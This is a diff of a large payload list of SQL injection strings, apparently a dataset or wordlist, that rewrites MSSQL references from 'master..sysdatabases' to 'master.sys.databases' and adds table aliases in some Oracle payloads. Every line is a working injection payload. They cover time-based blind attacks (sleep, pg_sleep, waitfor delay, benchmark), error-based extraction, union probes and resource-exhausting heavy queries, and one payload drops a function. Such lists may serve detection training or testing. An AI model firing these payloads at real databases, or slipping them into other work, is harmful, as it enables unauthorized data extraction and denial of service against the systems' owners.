 1' ) ) as mdtm where 1393 = 1393 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --
 -8057' ) ) as gpue where 4205 = 4205 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --
 1" or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) )
@@ -2541,7 +2487,7 @@ select sleep ( 5 ) and ( ( ( "wucy" like "wucy
 -1802' or 7931 = 5841--
 select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'teng' like 'teng
 1 union all select null,null,null,null,null#
-1', ( select ( case when ( 1902 = 5536 ) then 1 else 1902* ( select 1902 from master..sysdatabases ) end ) )
+1', ( select ( case when ( 1902 = 5536 ) then 1 else 1902* ( select 1902 from master.sys.databases ) end ) )
 -1390%" ) ) union all select 8930,8930,8930,8930,8930#
 1 where 1992 = 1992 union all select null,null--
 1" and 5205 = 9975#
@@ -2611,7 +2557,7 @@ call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||
 1' ) ) order by 1#
 end and ( ( ( "zpii" like "zpii
 1' ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( 'fuvv' = 'fuvv
-select ( case when ( 5970 = 2200 ) then 1 else 5970* ( select 5970 from master..sysdatabases ) end ) --
+select ( case when ( 5970 = 2200 ) then 1 else 5970* ( select 5970 from master.sys.databases ) end ) --
 -4756%' ) ) union all select 7824,7824,7824,7824,7824,7824,7824,7824#
 1" ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --
 1%" ) ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --
@@ -2786,7 +2732,7 @@ select pg_sleep ( 5 ) and 'rpka' = 'rpka
 1" ) as esks where 1138 = 1138
 1' and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and 'cipk' = 'cipk
 -1700%' or 4149 = 3391#
-select ( case when ( 9619 = 8679 ) then 1 else 9619* ( select 9619 from master..sysdatabases ) end ) --
+select ( case when ( 9619 = 8679 ) then 1 else 9619* ( select 9619 from master.sys.databases ) end ) --
 1' in boolean mode ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --
 select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ( '%' = '
 -1621' in boolean mode ) order by 1--
@@ -2830,7 +2776,7 @@ call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||
 1" where 2309 = 2309 or elt ( 5873 = 5873,sleep ( 5 ) ) #
 select ( case when ( 5198 = 2518 ) then 5198 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--
 1' ) waitfor delay '0:0:5' and ( 'vtfs' = 'vtfs
-select ( case when ( 8711 = 6432 ) then 1 else 8711* ( select 8711 from master..sysdatabases ) end ) --
+select ( case when ( 8711 = 6432 ) then 1 else 8711* ( select 8711 from master.sys.databases ) end ) --
 -8238' ) ) union all select 9797,9797,9797,9797,9797,9797,9797,9797#
 -8504 where 3086 = 3086 or 1131 = 9188#
 1' ) where 6772 = 6772 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --
@@ -2902,7 +2848,7 @@ end and ( ( 6874 = 6874
 1'+ ( select dpkp where 4836 = 4836 and sleep ( 5 ) ) +'
 -1631%" ) or elt ( 8285 = 1709,1709 ) and ( "%" = "
 waitfor delay '0:0:5'--
-select ( case when ( 9299 = 2760 ) then 1 else 9299* ( select 9299 from master..sysdatabases ) end ) --
+select ( case when ( 9299 = 2760 ) then 1 else 9299* ( select 9299 from master.sys.databases ) end ) --
 1'|| ( select 'brsr' where 5458 = 5458
 select count ( * ) from generate_series ( 1,5000000 ) and ( "%" = "
 iif ( 8214 = 4954,1,1/0 )
@@ -3087,7 +3033,7 @@ select ( case when ( 9816 = 1693 ) then 9816 else cast ( 1 as int ) / ( select 0
 1%' ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --
 1 ) ) ) union all select null,null,null,null,null,null#
 1 ) where 3076 = 3076 union all select null,null,null,null,null--
-select ( case when ( 9931 = 3424 ) then 1 else 9931* ( select 9931 from master..sysdatabases ) end ) --
+select ( case when ( 9931 = 3424 ) then 1 else 9931* ( select 9931 from master.sys.databases ) end ) --
 1" ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( "liar" = "liar
 1'+ ( select tzvm where 5145 = 5145 and 4192 = 7437#
 1" ) ) as ydkd where 2455 = 2455 and sleep ( 5 ) --
@@ -3138,7 +3084,7 @@ select sleep ( 5 ) and ( ( 3404 = 3404
 1%' ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( '%' = '
 1%' or elt ( 5873 = 5873,sleep ( 5 ) ) #
 1 where 8398 = 8398
-select ( case when ( 8808 = 1367 ) then 1 else 8808* ( select 8808 from master..sysdatabases ) end ) --
+select ( case when ( 8808 = 1367 ) then 1 else 8808* ( select 8808 from master.sys.databases ) end ) --
 select ( case when ( 7096 = 2568 ) then 7096 else 1/ ( select 0 ) end ) --
 1%' union all select null,null,null,null,null,null,null#
 -1375' ) ) ) or ( 1226 = 9648 ) *9648 and ( ( ( 'kfoy' like 'kfoy
@@ -3174,7 +3120,7 @@ select case when 9390 = 5752 then 1 else null end--
 call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( '%' = '
 1" where 8241 = 8241 union all select null,null,null#
 -8841%" ) or 4361 = 1910
-select ( case when ( 5163 = 4861 ) then 1 else 5163* ( select 5163 from master..sysdatabases ) end ) --
+select ( case when ( 5163 = 4861 ) then 1 else 5163* ( select 5163 from master.sys.databases ) end ) --
 1'|| ( select 'xsoq' from dual where 6690 = 6690 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) ) ||'
 1%" and 9198 = 9198--
 1' ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 'tvcm' = 'tvcm
@@ -3301,7 +3247,7 @@ select ( case when ( 3344 = 8103 ) then 3344 else 1/ ( select 0 ) end ) --
 1" ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( "ynde" = "ynde
 select * from generate_series ( 3607,3607,case when ( 3607 = 4242 ) then 1 else 0 end ) limit 1--
 1'|| ( select 'blvu' from dual where 9813 = 9813
-1, ( select ( case when ( 1609 = 1609 ) then waitfor delay '0:0:5' else 1609* ( select 1609 from master..sysdatabases ) end ) )
+1, ( select ( case when ( 1609 = 1609 ) then waitfor delay '0:0:5' else 1609* ( select 1609 from master.sys.databases ) end ) )
 1' and elt ( 4249 = 4249,7259 ) and 'pgvz' = 'pgvz
 -1304' ) union all select 7639#
 select ( case when ( 3681 = 5026 ) then 3681 else 3681* ( select 3681 from information_schema.character_sets ) end ) #
@@ -3367,7 +3313,7 @@ call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||
 -9996' or make_set ( 1237 = 7111,7111 )
 select ( case when ( 4690 = 4373 ) then 4690 else 1/ ( select 0 ) end ) --
 -6815 where 7609 = 7609 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #
-select ( case when ( 7005 = 7118 ) then 1 else 7005* ( select 7005 from master..sysdatabases ) end ) --
+select ( case when ( 7005 = 7118 ) then 1 else 7005* ( select 7005 from master.sys.databases ) end ) --
 1 ) ) as xsyk where 2575 = 2575 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --
 1 ) where 7815 = 7815 union all select null,null,null,null,null,null,null#
 select sleep ( 5 ) and 'eskp' like 'eskp
@@ -3406,7 +3352,7 @@ iif ( 3447 = 1084,1,1/0 )
 1'|| ( select 'uedk' where 4655 = 4655
 1%" or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --
 1' or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --
-select ( case when ( 1291 = 6612 ) then 1 else 1291* ( select 1291 from master..sysdatabases ) end ) --
+select ( case when ( 1291 = 6612 ) then 1 else 1291* ( select 1291 from master.sys.databases ) end ) --
 -2429%' or 6890 = 5846
 1%" ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ( "%" = "
 -4761 order by 1--
@@ -3539,7 +3485,7 @@ end and 'huti' like 'huti
 1" ) union all select null,null,null,null--
 -8015 ) where 9808 = 9808 or 9323 = 9323#
 1' ) ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( 'gucd' = 'gucd
-select ( case when ( 8978 = 1426 ) then 1 else 8978* ( select 8978 from master..sysdatabases ) end ) --
+select ( case when ( 8978 = 1426 ) then 1 else 8978* ( select 8978 from master.sys.databases ) end ) --
 1" ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --
 -1192 order by 1#
 1" ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #
@@ -3774,7 +3720,7 @@ select sleep ( 5 ) ) ||'
 1 ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #
 1'|| ( select 'cjwx' from dual where 7637 = 7637 and elt ( 9548 = 3991,3991 ) ) ||'
 -1164" ) union all select 6617,6617,6617,6617,6617,6617--
-select ( case when ( 4636 = 1108 ) then 1 else 4636* ( select 4636 from master..sysdatabases ) end ) --
+select ( case when ( 4636 = 1108 ) then 1 else 4636* ( select 4636 from master.sys.databases ) end ) --
 1" where 3510 = 3510
 1" ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( "fbqy" like "fbqy
 -8382" ) ) order by 1--
@@ -4047,7 +3993,7 @@ select ( case when ( 7852 = 7476 ) then 7852 else 7852* ( select 7852 from mysql
 -1475" ) union all select 8611,8611,8611#
 1' ) as saqp where 6612 = 6612 union all select null,null,null,null,null,null,null--
 1' ) ) ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --
-select ( case when ( 5752 = 6036 ) then 1 else 5752* ( select 5752 from master..sysdatabases ) end ) --
+select ( case when ( 5752 = 6036 ) then 1 else 5752* ( select 5752 from master.sys.databases ) end ) --
 1'|| ( select 'sbft' where 8748 = 8748
 1" ) where 2180 = 2180 and make_set ( 8403 = 8403,8899 ) --
 -7194'|| ( select 'gbrx' from dual where 6205 = 6205 union all select 6205,6205,6205,6205,6205,6205,6205#
@@ -4588,7 +4534,7 @@ select count ( * ) from generate_series ( 1,5000000 )
 1%' ) ) ) or sleep ( 5 ) and ( ( ( '%' = '
 1'|| ( select 'xtcb' where 5240 = 5240
 1' ) ) as popm where 6594 = 6594 union all select null,null#
-( select ( case when ( 7018 = 7018 ) then 7018 else 7018* ( select 7018 from master..sysdatabases ) end ) )
+( select ( case when ( 7018 = 7018 ) then 7018 else 7018* ( select 7018 from master.sys.databases ) end ) )
 -7770' where 6503 = 6503 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --
 1" ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( "nobt" = "nobt
 call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )
@@ -4637,7 +4583,7 @@ waitfor delay '0:0:5' and ( ( ( "lpeo" = "lpeo
 1'|| ( select 'gnil' from dual where 7552 = 7552 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) ) ||'
 1 ) ) as uvep where 6016 = 6016 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --
 1' ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( 'vpqr' = 'vpqr
-1', ( select ( case when ( 1609 = 1609 ) then waitfor delay '0:0:5' else 1609* ( select 1609 from master..sysdatabases ) end ) )
+1', ( select ( case when ( 1609 = 1609 ) then waitfor delay '0:0:5' else 1609* ( select 1609 from master.sys.databases ) end ) )
 1" ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( "cowu" like "cowu
 -5211 union all select 1754--
 1" ) as bpmk where 6412 = 6412 union all select null,null,null,null#
@@ -4653,7 +4599,7 @@ call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||
 1" or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and "cgpm" like "cgpm
 1" where 5250 = 5250
 1' ) ) as umah where 3781 = 3781 union all select null,null,null,null#
-( select ( case when ( 9525 = 9280 ) then 9525 else 9525* ( select 9525 from master..sysdatabases ) end ) )
+( select ( case when ( 9525 = 9280 ) then 9525 else 9525* ( select 9525 from master.sys.databases ) end ) )
 -9315' ) ) ) union all select 5057,5057,5057,5057,5057#
 -2962' ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 'hkjo' = 'hkjo
 1 ) ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ( 2197 = 2197
@@ -4685,7 +4631,7 @@ select sleep ( 5 ) ) +'
 1%" ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #
 ( select ( case when ( 3950 = 2747 ) then 1 else 1/ ( select 0 ) end ) )
 1%' ) union all select null,null,null,null,null#
-select ( case when ( 4755 = 4784 ) then 1 else 4755* ( select 4755 from master..sysdatabases ) end ) --
+select ( case when ( 4755 = 4784 ) then 1 else 4755* ( select 4755 from master.sys.databases ) end ) --
 1" or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and "jtgs" like "jtgs
 1' ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( 'nqol' = 'nqol
 1%' ) ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( '%' = '
@@ -5751,7 +5697,7 @@ select ( case when ( 5423 = 7706 ) then 5423 else cast ( 1 as int ) / ( select 0
 1" where 9901 = 9901 and ( 2455 = 8499 ) *8499--
 1" ) where 2496 = 2496
 1' where 4945 = 4945
-select ( case when ( 3435 = 4011 ) then 1 else 3435* ( select 3435 from master..sysdatabases ) end ) --
+select ( case when ( 3435 = 4011 ) then 1 else 3435* ( select 3435 from master.sys.databases ) end ) --
 1 ) as asmt where 4986 = 4986 union all select null,null#
 select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 'kyos' like 'kyos
 select sleep ( 5 ) and ( '%' = '
@@ -6047,7 +5993,7 @@ select * from generate_series ( 3267,3267,case when ( 3267 = 5900 ) then 1 else 
 1, ( cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 7823 = 7823 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) )
 1'|| ( select 'uvbb' where 7795 = 7795 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) ||'
 ( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ( 'ksoc' = 'ksoc
-select ( case when ( 1005 = 5996 ) then 1 else 1005* ( select 1005 from master..sysdatabases ) end ) --
+select ( case when ( 1005 = 5996 ) then 1 else 1005* ( select 1005 from master.sys.databases ) end ) --
 -9272%" ) ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( "%" = "
 1'+ ( select rdwb where 2498 = 2498 and 3429 = 7639--
 -9191' ) as qtvm where 2838 = 2838 or ( 8459 = 8459 ) *4906--
@@ -6263,7 +6209,7 @@ call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )
 -2007%' ) ) union all select 7298,7298,7298#
 1' where 4880 = 4880 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --
 1'+ ( select ankx where 6789 = 6789
-select ( case when ( 9388 = 4322 ) then 1 else 9388* ( select 9388 from master..sysdatabases ) end ) --
+select ( case when ( 9388 = 4322 ) then 1 else 9388* ( select 9388 from master.sys.databases ) end ) --
 1' ) ) as sxpk where 5524 = 5524 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --
 select sleep ( 5 ) and "jvys" like "jvys
 -6086" union all select 8700,8700,8700,8700--
@@ -6330,7 +6276,7 @@ select pg_sleep ( 5 ) and ( ( ( "wqeb" = "wqeb
 -9987 ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 2114 = 2114
 -2982' or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and 'iqwn' = 'iqwn
 1' union all select null,null,null,null,null,null,null,null,null--
-select ( case when ( 8642 = 6049 ) then 1 else 8642* ( select 8642 from master..sysdatabases ) end ) --
+select ( case when ( 8642 = 6049 ) then 1 else 8642* ( select 8642 from master.sys.databases ) end ) --
 1 where 1636 = 1636 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --
 1'|| ( select 'flbv' where 7451 = 7451 and 4595 = 4595#
 1%' ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( '%' = '
@@ -6342,7 +6288,7 @@ select sleep ( 5 ) and ( ( "rthl" like "rthl
 1'+ ( select 'fpnz' where 1592 = 1592 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) ) +'
 1 ) as hywx where 1424 = 1424 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --
 1 ) where 1559 = 1559 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --
-1' where 9994 = 9994 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --
+1' where 9994 = 9994 and 9660 = ( select count ( * ) from all_users as t1,all_users as t2,all_users as t3,all_users as t4,all_users as t5 ) --
 1 ) as qeav where 8127 = 8127 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --
 -1583' ) or elt ( 1032 = 1032,3623 ) and ( 'jrcj' like 'jrcj
 -6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#
@@ -6362,7 +6308,7 @@ select ( case when ( 8233 = 1074 ) then 8233 else 1/ ( select 0 ) end ) --
 1" ) as hsws where 6656 = 6656
 1' ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( 'ywxc' = 'ywxc
 1' in boolean mode ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) #
-1' and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --
+1' and 9660 = ( select count ( * ) from all_users as t1,all_users as t2,all_users as t3,all_users as t4,all_users as t5 ) --
 1,extractvalue ( 9788,concat ( 0x5c,0x7171706a71, ( select ( elt ( 9788 = 9788,1 ) ) ) ,0x717a767a71 ) )
 1' ) as xrap where 5523 = 5523 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #
 1 ) as pqle where 4039 = 4039 and 7533 = 7533--
@@ -6549,7 +6495,7 @@ make_set ( 6174 = 9734,1 )
 iif ( 1095 = 2853,1,1/0 )
 1" ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( "gixv" = "gixv
 1 ) where 9821 = 9821 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #
-select ( case when ( 4719 = 8852 ) then 1 else 4719* ( select 4719 from master..sysdatabases ) end ) --
+select ( case when ( 4719 = 8852 ) then 1 else 4719* ( select 4719 from master.sys.databases ) end ) --
 1" ) ) ) union all select null,null,null#
 1' or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and 'qvyq' like 'qvyq
 1' procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and 'zlxw' = 'zlxw
@@ -6929,7 +6875,7 @@ if ( 3245 = 6168 ) select 3245 else drop function nafj--
 1' ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )
 1', ( select ( case when ( 5249 = 9648 ) then 1 else 1/ ( select 0 ) end ) )
 1" ) as qwyt where 4236 = 4236 union all select null,null,null,null,null--
-select ( case when ( 2783 = 9216 ) then 1 else 2783* ( select 2783 from master..sysdatabases ) end ) --
+select ( case when ( 2783 = 9216 ) then 1 else 2783* ( select 2783 from master.sys.databases ) end ) --
 -2643%" union all select 7779,7779--
 1%" or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and "%" = "
 -1526' ) ) or elt ( 1032 = 1032,3623 ) and ( ( 'xpob' = 'xpob
@@ -6998,7 +6944,7 @@ call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )
 1' ) ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( 'vpus' = 'vpus
 1%" ) ) ) and ( 3502 = 7893 ) *7893 and ( ( ( "%" = "
 1" ) ) union all select null,null,null,null#
-1' ) ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 'ewwi' = 'ewwi
+1' ) ) ) or 5286 = ( select count ( * ) from all_users as t1,all_users as t2,all_users as t3,all_users as t4,all_users as t5 ) and ( ( ( 'ewwi' = 'ewwi
 1" ) as ronb where 9368 = 9368
 1 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) -- xwoo
 1" ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( "nubc" like "nubc
@@ -7023,7 +6969,7 @@ select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.sys
 1' and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and 'gpax' = 'gpax
 select * from generate_series ( 6200,6200,case when ( 6200 = 5449 ) then 1 else 0 end ) limit 1--
 1' procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and 'gbpg' = 'gbpg
-select ( case when ( 7169 = 7785 ) then 1 else 7169* ( select 7169 from master..sysdatabases ) end ) --
+select ( case when ( 7169 = 7785 ) then 1 else 7169* ( select 7169 from master.sys.databases ) end ) --
 1" ) ) ) and sleep ( 5 ) and ( ( ( "fdvc" like "fdvc
 1' where 1230 = 1230 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --
 select * from generate_series ( 9964,9964,case when ( 9964 = 4455 ) then 1 else 0 end ) limit 1--
@@ -7040,7 +6986,7 @@ if ( 4194 = 4133 ) select 4194 else drop function tqhz--
 -4873' ) ) ) or 3038 = 3038
 1' ) as njfg where 6392 = 6392 waitfor delay '0:0:5'--
 1' and 7533 = 7533 and 'jwgc' = 'jwgc
-select ( case when ( 2132 = 8969 ) then 1 else 2132* ( select 2132 from master..sysdatabases ) end ) --
+select ( case when ( 2132 = 8969 ) then 1 else 2132* ( select 2132 from master.sys.databases ) end ) --
 1' ) ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --
 1' ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( 'vjnf' like 'vjnf
 -2359' union all select 2687,2687,2687#
@@ -7069,7 +7015,7 @@ waitfor delay '0:0:5' and 'fjpf' like 'fjpf
 1' where 8083 = 8083 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) --
